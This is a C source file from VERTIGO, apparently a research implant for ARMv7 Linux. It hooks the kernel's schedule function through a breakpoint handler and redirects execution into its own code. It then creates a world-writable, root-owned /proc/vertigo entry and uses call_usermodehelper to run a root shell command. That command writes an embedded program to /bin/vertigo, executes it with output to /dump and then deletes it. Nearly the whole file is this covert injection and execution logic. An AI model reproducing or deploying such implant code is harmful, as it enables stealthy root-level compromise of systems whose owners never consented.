/* This file is part of VERTIGO.
 *
 * (C) Copyright 2013, Siege Technologies <http://www.siegetechnologies.com>
 * (C) Copyright 2013, Kirk Swidowski <http://www.swidowski.com>
 *
 * VERTIGO is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * VERTIGO is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with VERTIGO. If not, see <http://www.gnu.org/licenses/>.
 *
 * Written by Kirk Swidowski <kirk@swidowski.com>
 */

#include <config.h>
#include <defines.h>
#include <types.h>

#include <armv7lib/gen.h>
#include <armv7lib/vmsa/gen.h>
#include <armv7lib/vmsa/flt.h>
#include <armv7lib/vmsa/tt.h>
#include <armv7lib/vmsa/tlb.h>
#include <armv7lib/cmsa/cac.h>
#include <armv7lib/cmsa/bpa.h>

#include <fxplib/gen.h>

#include <dbglib/gen.h>

#include <stdlib/check.h>
#include <stdlib/string.h>

#include <socmod/soc.h>
#include <bkptmod/bkpt.h>
#include <sdwmod/sdw.h>
#include <linmod/lin.h>
#include <linmod/proc.h>
#include <linmod/fs.h>

#include <main.h>
#include <program.h>

#include <kernel/mas.h>

DBG_DEFINE_VARIABLE(main_dbg, DBG_LEVEL_3);

struct file_operations *fops;
u8_t *prog;

int file_mmap(void /*struct file*/ *file, struct vm_area_struct *vma) {

	tt_virtual_address_t va;
	tt_physical_address_t pa;
	u8_t **lprogram = gen_add_base(&prog);

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	//DBG_LOG_STATEMENT("file", file, main_dbg, DBG_LEVEL_3);
	//DBG_LOG_STATEMENT("vma->vm_start", vma->vm_start, main_dbg, DBG_LEVEL_3);
	//DBG_LOG_STATEMENT("vma->vm_end", vma->vm_end, main_dbg, DBG_LEVEL_3);
	//DBG_LOG_STATEMENT("vma->vm_pgoff", vma->vm_pgoff, main_dbg, DBG_LEVEL_3);
	//DBG_LOG_STATEMENT("vma->vm_aage_prot", vma->vm_page_prot.pgprot, main_dbg, DBG_LEVEL_3);

	//DBG_LOG_STATEMENT("(vma->vm_end - vma->vm_start)", (vma->vm_end - vma->vm_start), main_dbg, DBG_LEVEL_3);

	// mv_pgoff is actually a page frame number pfn so shift it left PAGE_SHIFT times
	// and then use that as the offset into our program buffer
	va.all = (u32_t)&((*lprogram)[(vma->vm_pgoff << 12)]);

	//DBG_LOG_STATEMENT("va.all", va.all, main_dbg, DBG_LEVEL_3);

	// we cant use the mas to translate the va to pa
	// because its not in our cached list
	// use the hardware to do the walk.
	gen_va_to_pa(va, &pa);

	//DBG_LOG_STATEMENT("pa", pa.all, main_dbg, DBG_LEVEL_3);

	// function expects a pft not a physical address which is just a physical address right shifted PAGE_SHIFT
	// times.
	lin_remap_pfn_range(vma, vma->vm_start, pa.all >> 12, (vma->vm_end - vma->vm_start), vma->vm_page_prot);

	return 0;
}

loff_t file_llseek(void /*struct file*/ *file, loff_t offset, int some_int) {
	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);
	return 0;
}

int file_open(void /*struct inode*/ *node, void /*struct file*/ *file) {

	u8_t **lprog = gen_add_base(&prog);
	u8_t *lprogram = (u8_t *)gen_add_base(&program);

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	// interesting i just realized that this may not work correctly
	// lin_remap_pfn_range is expecting physically contiguous memory
	// for example if the user space program tries to map more than
	// 4K then it will reference potentially garbage memory after
	// the first 4K.
	*lprog = lin_kmalloc(sizeof(program), GFP_KERNEL);

	if(*lprog == NULL) {
		return -1;
	}

	memcpy(*lprog, lprogram, sizeof(program));

	cac_flush_entire_data_cache();

	return 0;
}
int file_release(void /*struct inode*/ *node, void /*struct file*/ *file) {

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	u8_t **lprog = gen_add_base(&prog);
	struct file_operations *lfops = *(void **)gen_add_base(&fops);

	lin_kfree(*lprog);

	// this needs to be done from supervisor mode not und mode.
	//lin_remove_proc_entry(gen_add_base("vertigo"), NULL);

	//free(lfops);

	return 0;
}

ssize_t file_read(void /*struct file*/ *file, char *buffer, size_t size, loff_t *offset) {

	u8_t *lprogram_buffer = (u8_t *)gen_add_base(&program);
	size_t lprogram_size = sizeof(program);

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	DBG_LOG_STATEMENT("file", file, main_dbg, DBG_LEVEL_3);
	DBG_LOG_STATEMENT("buffer", buffer, main_dbg, DBG_LEVEL_3);
	DBG_LOG_STATEMENT("size", size, main_dbg, DBG_LEVEL_3);
	DBG_LOG_STATEMENT("offset", *offset, main_dbg, DBG_LEVEL_3);

	if(*offset >= lprogram_size) {
		//DBG_LOG_STATEMENT("eof reached", SUCCESS, main_dbg, DBG_LEVEL_3);
		// this is the end of the file
		return 0;
	}
	else if((lprogram_size - *offset) < size) {
		//DBG_LOG_STATEMENT("if((lprogram_size - offset) < length)", (lprogram_size - *offset), main_dbg, DBG_LEVEL_3);
		// fill the buffer with what we have left
		memset(buffer, 0, size);
		memcpy(buffer, &(lprogram_buffer[*offset]), (lprogram_size - *offset));
		*offset += (lprogram_size - *offset);
		return size;
	}
	else {
		//DBG_LOG_STATEMENT("read more", SUCCESS, main_dbg, DBG_LEVEL_3);
		// give it as much program as it requests
		memcpy(buffer, &(lprogram_buffer[*offset]), size);
		*offset += size;
		return size;
	}
}

// this is called from supervisor mode
void schedule_c(void) {

	struct file_operations *lfops = *(void **)gen_add_base(&fops);

	char *argv[] = { gen_add_base("/bin/sh"), gen_add_base("-c"), gen_add_base("cat /proc/vertigo > /bin/vertigo; chmod +x /bin/vertigo; /bin/vertigo > /dump; rm /bin/vertigo"), NULL };
	char *envp[] = { gen_add_base("HOME=/"), gen_add_base("TERM=vt100"), gen_add_base("PATH=/bin:/sbin"), NULL };

	void *sub_info;
	struct proc_dir_entry *entry;

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	lin_printk(gen_add_base("creating the /proc node\n"));

	entry = lin_create_proc_entry(gen_add_base("vertigo"), 777, NULL);

	lfops = malloc(sizeof(struct file_operations));

	lfops->open = gen_add_base(&file_open);
	lfops->read = gen_add_base(&file_read);
	lfops->release = gen_add_base(&file_release);
	lfops->mmap = gen_add_base(&file_mmap);

	entry->proc_fops = lfops;
	entry->uid = 0; // lets make sure we are root :)

	DBG_LOG_STATEMENT("after fops", 0, main_dbg, DBG_LEVEL_3);

	lin_printk(gen_add_base("executing the user space process\n"));

	sub_info = lin_call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL);

	if(sub_info == NULL) {
		return;
	}

	lin_call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);

	return;
}

// this is called in the undefined instruction mode
result_t bkpt_callback(bkpt_handler_t *handler, gen_general_purpose_registers_t *registers) {

	gen_program_status_register_t spsr;
	void **sched_ret;

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	spsr = gen_get_spsr();

	DBG_LOG_STATEMENT("mode", spsr.fields.m, main_dbg, DBG_LEVEL_2);

	if(spsr.fields.t == TRUE) {
		registers->lr -= 2;
	}
	else {
		registers->lr -= 4;
	}

	CHECK_SUCCESS(bkpt_unregister_handler(handler), "unable to remove bkpt handler", FAILURE, main_dbg, DBG_LEVEL_2)
		return FAILURE;
	CHECK_END

	sched_ret = gen_add_base(&schedule_return);

	// save the current link register so we can return to the
	*sched_ret = (void *)registers->lr;

	DBG_LOG_STATEMENT("*sched_ret", *sched_ret, main_dbg, DBG_LEVEL_2);

	// set the link register to our function
	registers->lr = (size_t)gen_add_base(schedule_asm);

	return SUCCESS;
}

result_t init_c(void) {

	gen_program_status_register_t cpsr;
	tt_virtual_address_t va;

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	// this function may not be the best one to hook
	// as in some cases the OS may need to schedule
	// something without waiting for our process
	// to be created
	lin_get_schedule_address((void **)&(va.all));

	// in order to create a user space process
	// we need to gain execution time inside of
	// supervisor mode in a controllable fashion.
	// so we can hook the entry point to the
	// schedule function and then save and
	// change the lr so when the core returns
	// to supervisor mode it will enter in
	// schedule_asm in our code and when we complete
	// we will pass execution back to
	// the entry point to the schedule
	// function in the kernel
	CHECK_SUCCESS(bkpt_register_handler(va, cpsr, gen_add_base(&bkpt_callback), NULL), "unable to add bkpt handler", FAILURE, main_dbg, DBG_LEVEL_2)
		return FAILURE;
	CHECK_END

	return SUCCESS;
}

result_t fini_c(void) {

	DBG_LOG_FUNCTION(main_dbg, DBG_LEVEL_3);

	return SUCCESS;
}

